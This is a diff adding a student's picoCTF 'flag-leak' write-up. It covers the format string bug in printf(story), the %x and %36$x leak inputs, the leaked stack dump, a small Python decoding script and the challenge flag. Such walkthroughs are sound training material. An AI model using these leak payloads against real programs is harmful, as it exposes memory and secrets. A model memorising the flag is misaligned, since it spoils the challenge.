@@ -29,9 +29,56 @@ attaching the image for reference.
 
 ## flag-leak
 
-Flag: ```picoCTF{L34k1ng_Fl4g_0ff_St4} ```
+Flag: ```picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}```
 
-Hints used: NONE
+Hints used: Youtube
+
+This was by far, the hardest challenge i came across in all of the mandatory challenges.
+
+In the code(vuln.c), line 32 => ```printf(story);```, there is a string formatting vulnerablilty, which means if i give an % identifier input, i can see everything on the stack.
+
+So i made a python file wherein i made little tweaks, to give a proper input in the .c code.
+
+I gave an input of 32 ```%x.``` and got an output of ```ffebc810.ffebc830.8049346.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.252e78.6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.```
+
+
+
+then i split the output using python(```ffebc810 ffebc830 8049346 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 252e78 6f636970 7b465443 6b34334c 5f676e31 67346c46 6666305f 3474535f ```)
+i converted ```6f636970 7b465443 6b34334c 5f676e31 67346c46 6666305f 3474535f``` because that is where the hex code changes.
+
+output=>
+![output](/assets/flag_leak1.png)
+
+since this is just half the flag, i counted the number from where the hex coded changed, which was 36.
+
+therefore i wrote another script for giving the input as ```%36$x.%37$x......``` and so on.
+
+from there, i got an output ```%36$x.%37$x.%38$x.%39$x.%40$x.%41$x.%42$x.%43$x.%44$x.%45$x.617}5f60ck_9_St4_0ffFl4g1ng_L34kCTF{pico``` which when reversed, although took some manual work, gave me the flag.
+
+here is the python code i wrote to automate some of the tasks.
+![code](/TP_2/chal_assets/trial.py)
+
+```
+lst = "ffebc810.ffebc830.8049346.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.252e78.6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.".split('.')
+
+s = ' '.join(lst)
+
+print(s)
+
+for i in range(36,46):
+    x = '%'+str(i)+'$x'
+    print(x, end='.') 
+
+
+flag = 'ocip{FTCk43L_gn1g4lFff0_4tS_9_kc06f5}716'[::-1]
+
+print(flag)
+
+'5f60ck_9_St4_0ffFl4g1ng_L34kCTF{pico'
+'picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}'
+```
+
+
 
 
 
